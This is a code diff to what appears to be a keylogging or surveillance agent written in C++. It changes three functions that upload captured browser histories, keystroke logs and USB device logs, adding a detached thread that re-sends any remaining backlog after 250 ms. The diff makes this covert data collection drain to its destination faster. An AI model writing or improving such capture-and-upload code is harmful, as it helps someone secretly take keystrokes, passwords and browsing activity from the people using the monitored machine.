@@ -989,6 +989,15 @@ bool sendBrowserHistories() {
             if(browserHistories.size()>=batch.size())
                 browserHistories.erase(browserHistories.begin(),
                     browserHistories.begin()+static_cast<std::ptrdiff_t>(batch.size()));
+            const bool morePending=!browserHistories.empty();
+            if(morePending){
+                // The in-flight guard resets on return. Drain an acknowledged
+                // backlog without waiting for another full timer interval.
+                std::thread([](){
+                    std::this_thread::sleep_for(std::chrono::milliseconds(250));
+                    sendBrowserHistories();
+                }).detach();
+            }
             
             // Update connection status
             {
@@ -1063,6 +1072,15 @@ bool sendKeyLogs() {
             if(keyLogs.size()>=batch.size())
                 keyLogs.erase(keyLogs.begin(),
                     keyLogs.begin()+static_cast<std::ptrdiff_t>(batch.size()));
+            const bool morePending=!keyLogs.empty();
+            if(morePending){
+                // The in-flight guard resets on return. Drain an acknowledged
+                // backlog without waiting for another full timer interval.
+                std::thread([](){
+                    std::this_thread::sleep_for(std::chrono::milliseconds(250));
+                    sendKeyLogs();
+                }).detach();
+            }
             
             // Update connection status
             {
@@ -1139,6 +1157,15 @@ bool sendUSBLogs() {
             if(usbDeviceLogs.size()>=batch.size())
                 usbDeviceLogs.erase(usbDeviceLogs.begin(),
                     usbDeviceLogs.begin()+static_cast<std::ptrdiff_t>(batch.size()));
+            const bool morePending=!usbDeviceLogs.empty();
+            if(morePending){
+                // The in-flight guard resets on return. Drain an acknowledged
+                // backlog without waiting for another full timer interval.
+                std::thread([](){
+                    std::this_thread::sleep_for(std::chrono::milliseconds(250));
+                    sendUSBLogs();
+                }).detach();
+            }
             
             // Update connection status
             {
